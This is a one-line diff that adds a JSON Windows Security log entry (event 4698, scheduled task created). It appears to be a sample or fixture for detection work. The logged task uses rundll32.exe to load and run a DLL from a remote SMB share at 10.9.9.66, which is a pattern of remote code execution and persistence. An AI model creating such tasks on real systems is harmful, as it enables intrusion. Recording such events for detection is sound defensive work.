@@ -1,0 +1,1 @@
+{"Event": {"System": {"EventID": 4698, "Channel": "Security", "Computer": "SRV08"}, "EventData": {"TaskName": "\\ShareLoad", "TaskContent": "<Actions><Exec><Command>rundll32.exe</Command><Arguments>\\\\10.9.9.66\\share\\up.dll,Run</Arguments></Exec></Actions>"}}}
